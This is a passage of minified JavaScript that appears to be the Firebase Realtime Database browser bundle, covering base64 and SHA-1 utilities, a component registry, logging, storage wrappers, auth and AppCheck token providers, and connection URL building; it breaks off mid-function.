!function(e,t){"object"==typeof exports&&"undefined"!=typeof module?t(require("@firebase/app")):"function"==typeof define&&define.amd?define(["@firebase/app"],t):t((e="undefined"!=typeof globalThis?globalThis:e||self).firebase)}(this,(function(e){"use strict";try{(function(){var t=function(e){return e&&"object"==typeof e&&"default"in e?e:{default:e}}(e),n=function(e,t){return(n=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(e,t){e.__proto__=t}||function(e,t){for(var n in t)Object.prototype.hasOwnProperty.call(t,n)&&(e[n]=t[n])})(e,t)};function r(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Class extends value "+String(t)+" is not a constructor or null");function r(){this.constructor=e}n(e,t),e.prototype=null===t?Object.create(t):(r.prototype=t.prototype,new r)}var i=function(){return(i=Object.assign||function(e){for(var t,n=1,r=arguments.length;n<r;n++)for(var i in t=arguments[n])Object.prototype.hasOwnProperty.call(t,i)&&(e[i]=t[i]);return e}).apply(this,arguments)};function o(e,t,n,r){return new(n=n||Promise)((function(i,o){function a(e){try{u(r.next(e))}catch(e){o(e)}}function s(e){try{u(r.throw(e))}catch(e){o(e)}}function u(e){var t;e.done?i(e.value):((t=e.value)instanceof n?t:new n((function(e){e(t)}))).then(a,s)}u((r=r.apply(e,t||[])).next())}))}function a(e,t){var n,r,i,o={label:0,sent:function(){if(1&i[0])throw i[1];return i[1]},trys:[],ops:[]},a={next:s(0),throw:s(1),return:s(2)};return"function"==typeof Symbol&&(a[Symbol.iterator]=function(){return this}),a;function s(a){return function(s){return function(a){if(n)throw new TypeError("Generator is already executing.");for(;o;)try{if(n=1,r&&(i=2&a[0]?r.return:a[0]?r.throw||((i=r.return)&&i.call(r),0):r.next)&&!(i=i.call(r,a[1])).done)return i;switch(r=0,(a=i?[2&a[0],i.value]:a)[0]){case 0:case 1:i=a;break;case 4:return o.label++,{value:a[1],done:!1};case 5:o.label++,r=a[1],a=[0];continue;case 7:a=o.ops.pop(),o.trys.pop();continue;default:if(!(i=0<(i=o.trys).length&&i[i.length-1])&&(6===a[0]||2===a[0])){o=0;continue}if(3===a[0]&&(!i||a[1]>i[0]&&a[1]<i[3])){o.label=a[1];break}if(6===a[0]&&o.label<i[1]){o.label=i[1],i=a;break}if(i&&o.label<i[2]){o.label=i[2],o.ops.push(a);break}i[2]&&o.ops.pop(),o.trys.pop();continue}a=t.call(e,o)}catch(e){a=[6,e],r=0}finally{n=i=0}if(5&a[0])throw a[1];return{value:a[0]?a[1]:void 0,done:!0}}([a,s])}}}function s(e){var t="function"==typeof Symbol&&Symbol.iterator,n=t&&e[t],r=0;if(n)return n.call(e);if(e&&"number"==typeof e.length)return{next:function(){return{value:(e=e&&r>=e.length?void 0:e)&&e[r++],done:!e}}};throw new TypeError(t?"Object is not iterable.":"Symbol.iterator is not defined.")}function u(e,t){var n="function"==typeof Symbol&&e[Symbol.iterator];if(!n)return e;var r,i,o=n.call(e),a=[];try{for(;(void 0===t||0<t--)&&!(r=o.next()).done;)a.push(r.value)}catch(e){i={error:e}}finally{try{r&&!r.done&&(n=o.return)&&n.call(o)}finally{if(i)throw i.error}}return a}function l(e,t){for(var n=0,r=t.length,i=e.length;n<r;n++,i++)e[i]=t[n];return e}function h(e){for(var t=[],n=0,r=0;r<e.length;r++){var i=e.charCodeAt(r);i<128?t[n++]=i:(i<2048?t[n++]=i>>6|192:(55296==(64512&i)&&r+1<e.length&&56320==(64512&e.charCodeAt(r+1))?(i=65536+((1023&i)<<10)+(1023&e.charCodeAt(++r)),t[n++]=i>>18|240,t[n++]=i>>12&63|128):t[n++]=i>>12|224,t[n++]=i>>6&63|128),t[n++]=63&i|128)}return t}function c(e){try{return y.decodeString(e,!0)}catch(e){console.error("base64Decode failed: ",e)}return null}var p=!1,d="${JSCORE_VERSION}",f=function(e,t){if(!e)throw _(t)},_=function(e){return new Error("Firebase Database ("+d+") INTERNAL ASSERT FAILED: "+e)},y={byteToCharMap_:null,charToByteMap_:null,byteToCharMapWebSafe_:null,charToByteMapWebSafe_:null,ENCODED_VALS_BASE:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",get ENCODED_VALS(){return this.ENCODED_VALS_BASE+"+/="},get ENCODED_VALS_WEBSAFE(){return this.ENCODED_VALS_BASE+"-_."},HAS_NATIVE_SUPPORT:"function"==typeof atob,encodeByteArray:function(e,t){if(!Array.isArray(e))throw Error("encodeByteArray takes an array as a parameter");this.init_();for(var n=t?this.byteToCharMapWebSafe_:this.byteToCharMap_,r=[],i=0;i<e.length;i+=3){var o=e[i],a=i+1<e.length,s=a?e[i+1]:0,u=i+2<e.length,l=(15&s)<<2|(h=u?e[i+2]:0)>>6,h=63&h;u||(h=64,a||(l=64)),r.push(n[o>>2],n[(3&o)<<4|s>>4],n[l],n[h])}return r.join("")},encodeString:function(e,t){return this.HAS_NATIVE_SUPPORT&&!t?btoa(e):this.encodeByteArray(h(e),t)},decodeString:function(e,t){return this.HAS_NATIVE_SUPPORT&&!t?atob(e):function(e){for(var t=[],n=0,r=0;n<e.length;){var i,o,a,s=e[n++];s<128?t[r++]=String.fromCharCode(s):191<s&&s<224?(o=e[n++],t[r++]=String.fromCharCode((31&s)<<6|63&o)):239<s&&s<365?(i=((7&s)<<18|(63&(o=e[n++]))<<12|(63&(a=e[n++]))<<6|63&e[n++])-65536,t[r++]=String.fromCharCode(55296+(i>>10)),t[r++]=String.fromCharCode(56320+(1023&i))):(o=e[n++],a=e[n++],t[r++]=String.fromCharCode((15&s)<<12|(63&o)<<6|63&a))}return t.join("")}(this.decodeStringToByteArray(e,t))},decodeStringToByteArray:function(e,t){this.init_();for(var n=t?this.charToByteMapWebSafe_:this.charToByteMap_,r=[],i=0;i<e.length;){var o=n[e.charAt(i++)],a=i<e.length?n[e.charAt(i)]:0,s=++i<e.length?n[e.charAt(i)]:64,u=++i<e.length?n[e.charAt(i)]:64;if(++i,null==o||null==a||null==s||null==u)throw Error();r.push(o<<2|a>>4),64!==s&&(r.push(a<<4&240|s>>2),64!==u&&r.push(s<<6&192|u))}return r},init_:function(){if(!this.byteToCharMap_){this.byteToCharMap_={},this.charToByteMap_={},this.byteToCharMapWebSafe_={},this.charToByteMapWebSafe_={};for(var e=0;e<this.ENCODED_VALS.length;e++)this.byteToCharMap_[e]=this.ENCODED_VALS.charAt(e),this.charToByteMap_[this.byteToCharMap_[e]]=e,this.byteToCharMapWebSafe_[e]=this.ENCODED_VALS_WEBSAFE.charAt(e),(this.charToByteMapWebSafe_[this.byteToCharMapWebSafe_[e]]=e)>=this.ENCODED_VALS_BASE.length&&(this.charToByteMap_[this.ENCODED_VALS_WEBSAFE.charAt(e)]=e,this.charToByteMapWebSafe_[this.ENCODED_VALS.charAt(e)]=e)}}};function v(e){return"__proto__"!==e}var g=(m.prototype.wrapCallback=function(e){var t=this;return function(n,r){n?t.reject(n):t.resolve(r),"function"==typeof e&&(t.promise.catch((function(){})),1===e.length?e(n):e(n,r))}},m);function m(){var e=this;this.reject=function(){},this.resolve=function(){},this.promise=new Promise((function(t,n){e.resolve=t,e.reject=n}))}function w(){return"undefined"!=typeof window&&(window.cordova||window.phonegap||window.PhoneGap)&&/ios|iphone|ipod|ipad|android|blackberry|iemobile/i.test("undefined"!=typeof navigator&&"string"==typeof navigator.userAgent?navigator.userAgent:"")}function C(){return!0===p}var b,T=(r(E,b=Error),E);function E(e,t,n){return(t=b.call(this,t)||this).code=e,t.customData=n,t.name="FirebaseError",Object.setPrototypeOf(t,E.prototype),Error.captureStackTrace&&Error.captureStackTrace(t,I.prototype.create),t}var I=(S.prototype.create=function(e){for(var t=[],n=1;n<arguments.length;n++)t[n-1]=arguments[n];var r,i=t[0]||{},o=this.service+"/"+e;e=(e=this.errors[e])?(r=i,e.replace(k,(function(e,t){var n=r[t];return null!=n?String(n):"<"+t+"?>"}))):"Error",e=this.serviceName+": "+e+" ("+o+").";return new T(o,e,i)},S);function S(e,t,n){this.service=e,this.serviceName=t,this.errors=n}var k=/\{\$([^}]+)}/g;function P(e){return JSON.parse(e)}function N(e){return JSON.stringify(e)}function x(e){var t={},n={},r={},i="";try{var o=e.split(".");t=P(c(o[0])||""),n=P(c(o[1])||""),i=o[2],r=n.d||{};delete n.d}catch(e){}return{header:t,claims:n,data:r,signature:i}}function R(e,t){return Object.prototype.hasOwnProperty.call(e,t)}function O(e,t){if(Object.prototype.hasOwnProperty.call(e,t))return e[t]}function D(e){for(var t in e)if(Object.prototype.hasOwnProperty.call(e,t))return!1;return!0}function A(e,t,n){var r,i={};for(r in e)Object.prototype.hasOwnProperty.call(e,r)&&(i[r]=t.call(n,e[r],r,e));return i}var L=(M.prototype.reset=function(){this.chain_[0]=1732584193,this.chain_[1]=4023233417,this.chain_[2]=2562383102,this.chain_[3]=271733878,this.chain_[4]=3285377520,this.inbuf_=0,this.total_=0},M.prototype.compress_=function(e,t){t=t||0;var n=this.W_;if("string"==typeof e)for(var r=0;r<16;r++)n[r]=e.charCodeAt(t)<<24|e.charCodeAt(t+1)<<16|e.charCodeAt(t+2)<<8|e.charCodeAt(t+3),t+=4;else for(r=0;r<16;r++)n[r]=e[t]<<24|e[t+1]<<16|e[t+2]<<8|e[t+3],t+=4;for(r=16;r<80;r++){var i=n[r-3]^n[r-8]^n[r-14]^n[r-16];n[r]=4294967295&(i<<1|i>>>31)}var o,a=this.chain_[0],s=this.chain_[1],u=this.chain_[2],l=this.chain_[3],h=this.chain_[4];for(r=0;r<80;r++){var c=r<40?r<20?(o=l^s&(u^l),1518500249):(o=s^u^l,1859775393):r<60?(o=s&u|l&(s|u),2400959708):(o=s^u^l,3395469782);i=(a<<5|a>>>27)+o+h+c+n[r]&4294967295,h=l,l=u,u=4294967295&(s<<30|s>>>2),s=a,a=i}this.chain_[0]=this.chain_[0]+a&4294967295,this.chain_[1]=this.chain_[1]+s&4294967295,this.chain_[2]=this.chain_[2]+u&4294967295,this.chain_[3]=this.chain_[3]+l&4294967295,this.chain_[4]=this.chain_[4]+h&4294967295},M.prototype.update=function(e,t){if(null!=e){for(var n=(t=void 0===t?e.length:t)-this.blockSize,r=0,i=this.buf_,o=this.inbuf_;r<t;){if(0===o)for(;r<=n;)this.compress_(e,r),r+=this.blockSize;if("string"==typeof e){for(;r<t;)if(i[o]=e.charCodeAt(r),++r,++o===this.blockSize){this.compress_(i),o=0;break}}else for(;r<t;)if(i[o]=e[r],++r,++o===this.blockSize){this.compress_(i),o=0;break}}this.inbuf_=o,this.total_+=t}},M.prototype.digest=function(){var e=[],t=8*this.total_;this.inbuf_<56?this.update(this.pad_,56-this.inbuf_):this.update(this.pad_,this.blockSize-(this.inbuf_-56));for(var n=this.blockSize-1;56<=n;n--)this.buf_[n]=255&t,t/=256;this.compress_(this.buf_);var r=0;for(n=0;n<5;n++)for(var i=24;0<=i;i-=8)e[r]=this.chain_[n]>>i&255,++r;return e},M);function M(){this.chain_=[],this.buf_=[],this.W_=[],this.pad_=[],this.inbuf_=0,this.total_=0,this.blockSize=64,this.pad_[0]=128;for(var e=1;e<this.blockSize;++e)this.pad_[e]=0;this.reset()}function F(e,t,n,r){var i;if(r<t?i="at least "+t:n<r&&(i=0===n?"none":"no more than "+n),i)throw new Error(e+" failed: Was called with "+r+(1===r?" argument.":" arguments.")+" Expects "+i+".")}function q(e,t){return e+" failed: "+t+" argument "}function W(e,t,n,r){if((!r||n)&&"function"!=typeof n)throw new Error(q(e,t)+"must be a valid function.")}function j(e,t,n,r){if((!r||n)&&("object"!=typeof n||null===n))throw new Error(q(e,t)+"must be a valid context object.")}function U(e){for(var t=0,n=0;n<e.length;n++){var r=e.charCodeAt(n);r<128?t++:r<2048?t+=2:55296<=r&&r<=56319?(t+=4,n++):t+=3}return t}function B(e){return e&&e._delegate?e._delegate:e}var z=(V.prototype.setInstantiationMode=function(e){return this.instantiationMode=e,this},V.prototype.setMultipleInstances=function(e){return this.multipleInstances=e,this},V.prototype.setServiceProps=function(e){return this.serviceProps=e,this},V.prototype.setInstanceCreatedCallback=function(e){return this.onInstanceCreated=e,this},V);function V(e,t,n){this.name=e,this.instanceFactory=t,this.type=n,this.multipleInstances=!1,this.serviceProps={},this.instantiationMode="LAZY",this.onInstanceCreated=null}var H="[DEFAULT]",Q=(Y.prototype.get=function(e){var t=this.normalizeInstanceIdentifier(e);if(!this.instancesDeferred.has(t)&&(e=new g,this.instancesDeferred.set(t,e),this.isInitialized(t)||this.shouldAutoInitialize()))try{var n=this.getOrInitializeService({instanceIdentifier:t});n&&e.resolve(n)}catch(e){}return this.instancesDeferred.get(t).promise},Y.prototype.getImmediate=function(e){var t=this.normalizeInstanceIdentifier(null==e?void 0:e.identifier);e=null!==(e=null==e?void 0:e.optional)&&void 0!==e&&e;if(!this.isInitialized(t)&&!this.shouldAutoInitialize()){if(e)return null;throw Error("Service "+this.name+" is not available")}try{return this.getOrInitializeService({instanceIdentifier:t})}catch(t){if(e)return null;throw t}},Y.prototype.getComponent=function(){return this.component},Y.prototype.setComponent=function(e){var t,n;if(e.name!==this.name)throw Error("Mismatching Component "+e.name+" for Provider "+this.name+".");if(this.component)throw Error("Component for "+this.name+" has already been provided");if(this.component=e,this.shouldAutoInitialize()){if("EAGER"===e.instantiationMode)try{this.getOrInitializeService({instanceIdentifier:H})}catch(e){}try{for(var r=s(this.instancesDeferred.entries()),i=r.next();!i.done;i=r.next()){var o=u(i.value,2),a=o[0],l=o[1],h=this.normalizeInstanceIdentifier(a);try{var c=this.getOrInitializeService({instanceIdentifier:h});l.resolve(c)}catch(e){}}}catch(e){t={error:e}}finally{try{i&&!i.done&&(n=r.return)&&n.call(r)}finally{if(t)throw t.error}}}},Y.prototype.clearInstance=function(e){this.instancesDeferred.delete(e=void 0===e?H:e),this.instances.delete(e)},Y.prototype.delete=function(){return o(this,void 0,void 0,(function(){var e;return a(this,(function(t){switch(t.label){case 0:return e=Array.from(this.instances.values()),[4,Promise.all(l(l([],u(e.filter((function(e){return"INTERNAL"in e})).map((function(e){return e.INTERNAL.delete()})))),u(e.filter((function(e){return"_delete"in e})).map((function(e){return e._delete()})))))];case 1:return t.sent(),[2]}}))}))},Y.prototype.isComponentSet=function(){return null!=this.component},Y.prototype.isInitialized=function(e){return this.instances.has(e=void 0===e?H:e)},Y.prototype.initialize=function(e){var t,n,r=void 0===(r=(e=void 0===e?{}:e).options)?{}:r,i=this.normalizeInstanceIdentifier(e.instanceIdentifier);if(this.isInitialized(i))throw Error(this.name+"("+i+") has already been initialized");if(!this.isComponentSet())throw Error("Component "+this.name+" has not been registered yet");var o=this.getOrInitializeService({instanceIdentifier:i,options:r});try{for(var a=s(this.instancesDeferred.entries()),l=a.next();!l.done;l=a.next()){var h=u(l.value,2),c=h[0],p=h[1];i===this.normalizeInstanceIdentifier(c)&&p.resolve(o)}}catch(e){t={error:e}}finally{try{l&&!l.done&&(n=a.return)&&n.call(a)}finally{if(t)throw t.error}}return o},Y.prototype.onInit=function(e,t){var n=this.normalizeInstanceIdentifier(t),r=null!==(t=this.onInitCallbacks.get(n))&&void 0!==t?t:new Set;return r.add(e),this.onInitCallbacks.set(n,r),(t=this.instances.get(n))&&e(t,n),function(){r.delete(e)}},Y.prototype.invokeOnInitCallbacks=function(e,t){var n,r,i=this.onInitCallbacks.get(t);if(i)try{for(var o=s(i),a=o.next();!a.done;a=o.next()){var u=a.value;try{u(e,t)}catch(e){}}}catch(e){n={error:e}}finally{try{a&&!a.done&&(r=o.return)&&r.call(o)}finally{if(n)throw n.error}}},Y.prototype.getOrInitializeService=function(e){var t=e.instanceIdentifier,n=e.options,r=void 0===n?{}:n;if(!(e=this.instances.get(t))&&this.component&&(e=this.component.instanceFactory(this.container,{instanceIdentifier:(n=t)===H?void 0:n,options:r}),this.instances.set(t,e),this.invokeOnInitCallbacks(e,t),this.component.onInstanceCreated))try{this.component.onInstanceCreated(this.container,t,e)}catch(e){}return e||null},Y.prototype.normalizeInstanceIdentifier=function(e){return void 0===e&&(e=H),!this.component||this.component.multipleInstances?e:H},Y.prototype.shouldAutoInitialize=function(){return!!this.component&&"EXPLICIT"!==this.component.instantiationMode},Y);function Y(e,t){this.name=e,this.container=t,this.component=null,this.instances=new Map,this.instancesDeferred=new Map,this.onInitCallbacks=new Map}var K,G=($.prototype.addComponent=function(e){var t=this.getProvider(e.name);if(t.isComponentSet())throw new Error("Component "+e.name+" has already been registered with "+this.name);t.setComponent(e)},$.prototype.addOrOverwriteComponent=function(e){this.getProvider(e.name).isComponentSet()&&this.providers.delete(e.name),this.addComponent(e)},$.prototype.getProvider=function(e){if(this.providers.has(e))return this.providers.get(e);var t=new Q(e,this);return this.providers.set(e,t),t},$.prototype.getProviders=function(){return Array.from(this.providers.values())},$);function $(e){this.name=e,this.providers=new Map}function J(e,t){for(var n=[],r=2;r<arguments.length;r++)n[r-2]=arguments[r];if(!(t<e.logLevel)){var i=(new Date).toISOString(),o=ee[t];if(!o)throw new Error("Attempted to log a message with an invalid logType (value: "+t+")");console[o].apply(console,l(["["+i+"]  "+e.name+":"],n))}}(yt=K=K||{})[yt.DEBUG=0]="DEBUG",yt[yt.VERBOSE=1]="VERBOSE",yt[yt.INFO=2]="INFO",yt[yt.WARN=3]="WARN",yt[yt.ERROR=4]="ERROR",yt[yt.SILENT=5]="SILENT";var X={debug:K.DEBUG,verbose:K.VERBOSE,info:K.INFO,warn:K.WARN,error:K.ERROR,silent:K.SILENT},Z=K.INFO,ee=((gt={})[K.DEBUG]="log",gt[K.VERBOSE]="log",gt[K.INFO]="info",gt[K.WARN]="warn",gt[K.ERROR]="error",gt),te=(Object.defineProperty(ne.prototype,"logLevel",{get:function(){return this._logLevel},set:function(e){if(!(e in K))throw new TypeError('Invalid value "'+e+'" assigned to `logLevel`');this._logLevel=e},enumerable:!1,configurable:!0}),ne.prototype.setLogLevel=function(e){this._logLevel="string"==typeof e?X[e]:e},Object.defineProperty(ne.prototype,"logHandler",{get:function(){return this._logHandler},set:function(e){if("function"!=typeof e)throw new TypeError("Value assigned to `logHandler` must be a function");this._logHandler=e},enumerable:!1,configurable:!0}),Object.defineProperty(ne.prototype,"userLogHandler",{get:function(){return this._userLogHandler},set:function(e){this._userLogHandler=e},enumerable:!1,configurable:!0}),ne.prototype.debug=function(){for(var e=[],t=0;t<arguments.length;t++)e[t]=arguments[t];this._userLogHandler&&this._userLogHandler.apply(this,l([this,K.DEBUG],e)),this._logHandler.apply(this,l([this,K.DEBUG],e))},ne.prototype.log=function(){for(var e=[],t=0;t<arguments.length;t++)e[t]=arguments[t];this._userLogHandler&&this._userLogHandler.apply(this,l([this,K.VERBOSE],e)),this._logHandler.apply(this,l([this,K.VERBOSE],e))},ne.prototype.info=function(){for(var e=[],t=0;t<arguments.length;t++)e[t]=arguments[t];this._userLogHandler&&this._userLogHandler.apply(this,l([this,K.INFO],e)),this._logHandler.apply(this,l([this,K.INFO],e))},ne.prototype.warn=function(){for(var e=[],t=0;t<arguments.length;t++)e[t]=arguments[t];this._userLogHandler&&this._userLogHandler.apply(this,l([this,K.WARN],e)),this._logHandler.apply(this,l([this,K.WARN],e))},ne.prototype.error=function(){for(var e=[],t=0;t<arguments.length;t++)e[t]=arguments[t];this._userLogHandler&&this._userLogHandler.apply(this,l([this,K.ERROR],e)),this._logHandler.apply(this,l([this,K.ERROR],e))},ne);function ne(e){this.name=e,this._logLevel=Z,this._logHandler=J,this._userLogHandler=null}var re="";function ie(e){re=e}var oe=(ae.prototype.set=function(e,t){null==t?this.domStorage_.removeItem(this.prefixedName_(e)):this.domStorage_.setItem(this.prefixedName_(e),N(t))},ae.prototype.get=function(e){return null==(e=this.domStorage_.getItem(this.prefixedName_(e)))?null:P(e)},ae.prototype.remove=function(e){this.domStorage_.removeItem(this.prefixedName_(e))},ae.prototype.prefixedName_=function(e){return this.prefix_+e},ae.prototype.toString=function(){return this.domStorage_.toString()},ae);function ae(e){this.domStorage_=e,this.prefix_="firebase:"}var se=(ue.prototype.set=function(e,t){null==t?delete this.cache_[e]:this.cache_[e]=t},ue.prototype.get=function(e){return R(this.cache_,e)?this.cache_[e]:null},ue.prototype.remove=function(e){delete this.cache_[e]},ue);function ue(){this.cache_={},this.isInMemoryStorage=!0}function le(e){var t=function(e){for(var t=[],n=0,r=0;r<e.length;r++){var i,o=e.charCodeAt(r);55296<=o&&o<=56319&&(i=o-55296,f(++r<e.length,"Surrogate pair missing trail surrogate."),o=65536+(i<<10)+(e.charCodeAt(r)-56320)),o<128?t[n++]=o:(o<2048?t[n++]=o>>6|192:(o<65536?t[n++]=o>>12|224:(t[n++]=o>>18|240,t[n++]=o>>12&63|128),t[n++]=o>>6&63|128),t[n++]=63&o|128)}return t}(e);return(e=new L).update(t),e=e.digest(),y.encodeByteArray(e)}function he(e,t){f(!t||!0===e||!1===e,"Can't turn on custom loggers persistently."),!0===e?(me.logLevel=K.VERBOSE,be=me.log.bind(me),t&&ge.set("logging_enabled",!0)):"function"==typeof e?be=e:(be=null,ge.remove("logging_enabled"))}function ce(){for(var e=[],t=0;t<arguments.length;t++)e[t]=arguments[t];var n="FIREBASE INTERNAL ERROR: "+Ce.apply(void 0,l([],u(e)));me.error(n)}function pe(e){return"number"==typeof e&&(e!=e||e===Number.POSITIVE_INFINITY||e===Number.NEGATIVE_INFINITY)}function de(e,t){return e===t?0:e<t?-1:1}function fe(e,t){if(t&&e in t)return t[e];throw new Error("Missing required key ("+e+") in object: "+N(t))}function _e(e,t){var n=e.length;if(n<=t)return[e];for(var r=[],i=0;i<n;i+=t)n<i+t?r.push(e.substring(i,n)):r.push(e.substring(i,i+t));return r}var ye,ve=(Xt=function(e){try{if("undefined"!=typeof window&&void 0!==window[e]){var t=window[e];return t.setItem("firebase:sentinel","cache"),t.removeItem("firebase:sentinel"),new oe(t)}}catch(e){}return new se})("localStorage"),ge=Xt("sessionStorage"),me=new te("@firebase/database"),we=(ye=1,function(){return ye++}),Ce=function(){for(var e=[],t=0;t<arguments.length;t++)e[t]=arguments[t];for(var n="",r=0;r<e.length;r++){var i=e[r];Array.isArray(i)||i&&"object"==typeof i&&"number"==typeof i.length?n+=Ce.apply(null,i):n+="object"==typeof i?N(i):i,n+=" "}return n},be=null,Te=!0,Ee=function(){for(var e,t=[],n=0;n<arguments.length;n++)t[n]=arguments[n];!0===Te&&(Te=!1,null===be&&!0===ge.get("logging_enabled")&&he(!0)),be&&(e=Ce.apply(null,t),be(e))},Ie=function(e){return function(){for(var t=[],n=0;n<arguments.length;n++)t[n]=arguments[n];Ee.apply(void 0,l([e],u(t)))}},Se=function(){for(var e=[],t=0;t<arguments.length;t++)e[t]=arguments[t];var n="FIREBASE FATAL ERROR: "+Ce.apply(void 0,l([],u(e)));throw me.error(n),new Error(n)},ke=function(){for(var e=[],t=0;t<arguments.length;t++)e[t]=arguments[t];var n="FIREBASE WARNING: "+Ce.apply(void 0,l([],u(e)));me.warn(n)},Pe="[MIN_NAME]",Ne="[MAX_NAME]",xe=function(e,t){if(e===t)return 0;if(e===Pe||t===Ne)return-1;if(t===Pe||e===Ne)return 1;var n=qe(e),r=qe(t);return null!==n?null!==r?n-r==0?e.length-t.length:n-r:-1:null===r&&e<t?-1:1},Re=function(e){if("object"!=typeof e||null===e)return N(e);var t,n=[];for(t in e)n.push(t);n.sort();for(var r="{",i=0;i<n.length;i++)0!==i&&(r+=","),r+=N(n[i]),r+=":",r+=Re(e[n[i]]);return r+"}"};function Oe(e,t){for(var n in e)e.hasOwnProperty(n)&&t(n,e[n])}function De(e){var t,n,r,i;f(!pe(e),"Invalid JSON number"),0===e?t=1/e==-1/(r=n=0)?1:0:(t=e<0,r=(e=Math.abs(e))>=Math.pow(2,-1022)?(n=(i=Math.min(Math.floor(Math.log(e)/Math.LN2),1023))+1023,Math.round(e*Math.pow(2,52-i)-Math.pow(2,52))):(n=0,Math.round(e/Math.pow(2,-1074))));for(var o=[],a=52;a;--a)o.push(r%2?1:0),r=Math.floor(r/2);for(a=11;a;--a)o.push(n%2?1:0),n=Math.floor(n/2);o.push(t?1:0),o.reverse();var s=o.join(""),u="";for(a=0;a<64;a+=8){var l=parseInt(s.substr(a,8),2).toString(16);u+=l=1===l.length?"0"+l:l}return u.toLowerCase()}function Ae(e,t){return"object"==typeof(t=setTimeout(e,t))&&t.unref&&t.unref(),t}var Le=new RegExp("^-?(0*)\\d{1,10}$"),Me=-2147483648,Fe=2147483647,qe=function(e){return Le.test(e)&&(e=Number(e),Me<=e&&e<=Fe)?e:null},We=function(e){try{e()}catch(e){setTimeout((function(){var t=e.stack||"";throw ke("Exception was thrown by user callback.",t),e}),Math.floor(0))}},je=(Ue.prototype.getToken=function(e){var t=this;return this.appCheck?this.appCheck.getToken(e):new Promise((function(n,r){setTimeout((function(){t.appCheck?t.getToken(e).then(n,r):n(null)}),0)}))},Ue.prototype.addTokenChangeListener=function(e){var t;null!==(t=this.appCheckProvider)&&void 0!==t&&t.get().then((function(t){return t.addTokenListener(e)}))},Ue.prototype.notifyForInvalidToken=function(){ke('Provided AppCheck credentials for the app named "'+this.appName_+'" are invalid. This usually indicates your app was not initialized correctly.')},Ue);function Ue(e,t){var n=this;this.appName_=e,this.appCheckProvider=t,this.appCheck=null==t?void 0:t.getImmediate({optional:!0}),this.appCheck||null!=t&&t.get().then((function(e){return n.appCheck=e}))}var Be=(ze.prototype.getToken=function(e){var t=this;return this.auth_?this.auth_.getToken(e).catch((function(e){return e&&"auth/token-not-initialized"===e.code?(Ee("Got auth/token-not-initialized error.  Treating as null token."),null):Promise.reject(e)})):new Promise((function(n,r){setTimeout((function(){t.auth_?t.getToken(e).then(n,r):n(null)}),0)}))},ze.prototype.addTokenChangeListener=function(e){this.auth_?this.auth_.addAuthTokenListener(e):this.authProvider_.get().then((function(t){return t.addAuthTokenListener(e)}))},ze.prototype.removeTokenChangeListener=function(e){this.authProvider_.get().then((function(t){return t.removeAuthTokenListener(e)}))},ze.prototype.notifyForInvalidToken=function(){var e='Provided authentication credentials for the app named "'+this.appName_+'" are invalid. This usually indicates your app was not initialized correctly. ';"credential"in this.firebaseOptions_?e+='Make sure the "credential" property provided to initializeApp() is authorized to access the specified "databaseURL" and is from the correct project.':"serviceAccount"in this.firebaseOptions_?e+='Make sure the "serviceAccount" property provided to initializeApp() is authorized to access the specified "databaseURL" and is from the correct project.':e+='Make sure the "apiKey" and "databaseURL" properties provided to initializeApp() match the values provided for your app at https://console.firebase.google.com/.',ke(e)},ze);function ze(e,t,n){var r=this;this.appName_=e,this.firebaseOptions_=t,this.authProvider_=n,this.auth_=null,this.auth_=n.getImmediate({optional:!0}),this.auth_||n.onInit((function(e){return r.auth_=e}))}var Ve=(He.prototype.getToken=function(e){return Promise.resolve({accessToken:this.accessToken})},He.prototype.addTokenChangeListener=function(e){e(this.accessToken)},He.prototype.removeTokenChangeListener=function(e){},He.prototype.notifyForInvalidToken=function(){},He.OWNER="owner",He);function He(e){this.accessToken=e}var Qe=/(console\.firebase|firebase-console-\w+\.corp|firebase\.corp)\.google\.com/,Ye="websocket",Ke="long_polling",Ge=($e.prototype.isCacheableHost=function(){return"s-"===this.internalHost.substr(0,2)},$e.prototype.isCustomHost=function(){return"firebaseio.com"!==this._domain&&"firebaseio-demo.com"!==this._domain},Object.defineProperty($e.prototype,"host",{get:function(){return this._host},set:function(e){e!==this.internalHost&&(this.internalHost=e,this.isCacheableHost()&&ve.set("host:"+this._host,this.internalHost))},enumerable:!1,configurable:!0}),$e.prototype.toString=function(){var e=this.toURLString();return this.persistenceKey&&(e+="<"+this.persistenceKey+">"),e},$e.prototype.toURLString=function(){var e=this.secure?"https://":"http://",t=this.includeNamespaceInQueryParams?"?ns="+this.namespace:"";return e+this.host+"/"+t},$e);function $e(e,t,n,r,i,o,a){void 0===i&&(i=!1),void 0===o&&(o=""),void 0===a&&(a=!1),this.secure=t,this.namespace=n,this.webSocketOnly=r,this.nodeAdmin=i,this.persistenceKey=o,this.includeNamespaceInQueryParams=a,this._host=e.toLowerCase(),this._domain=this._host.substr(this._host.indexOf(".")+1),this.internalHost=ve.get("host:"+e)||this._host}function Je(e,t,n){var r;if(f("string"==typeof t,"typeof type must == string"),f("object"==typeof n,"typeof params must == object"),t===Ye)r=(e.secure?"wss://":"ws://")+e.internalHost+"/.ws?";else{if(t!==Ke)throw new Error("Unknown connection type: "+t);r=(e.secure?"https://":"http://")+e.internalHost+"/.lp?"}((t=e).host!==t.internalHost||t.isCustomHost()||t.includeNamespaceInQueryParams)&&(n.ns=e.namespace);var i=[];return Oe(n,(function(e,t){i.push(e+"="+t)})),r+i.join("&")}var Xe=(Ze.prototype.incrementCounter=function(e,t){void 0===t&&(t=1),R(this.counters_,e)||(this.counters_[e]=0),this.counters_[e]+=t},Ze.prototype.get=function(){return function(e){return function e(t,n){if(!(n instanceof Object))return n;switch(n.constructor){case Date:return new Date(n.getTime());case Object:void 0===t&&(t={});break;case Array:t=[];break;default:return n}for(var r in n)n.hasOwnProperty(r)&&v(r)&&(t[r]=e(t[r],n[r]));return t}(void 0,e)}(this.counters_)},Ze);function Ze(){this.counters_={}}var et={},tt={};function nt(e){return e=e.toString(),et[e]||(et[e]=new Xe),et[e]}var rt=(it.prototype.closeAfter=function(e,t){this.closeAfterResponse=e,this.onClose=t,this.closeAfterResponse<this.currentResponseNum&&(this.onClose(),this.onClose=null)},it.prototype.handleResponse=function(e,t){var n=this;this.pendingResponses[e]=t;for(var r=function(){var e=i.pendingResponses[i.currentResponseNum];delete i.pendingResponses[i.currentResponseNum];for(var t=0;t<e.length;++t)!function(t){e[t]&&We((function(){n.onMessage_(e[t])}))}(t);if(i.currentResponseNum===i.closeAfterResponse)return 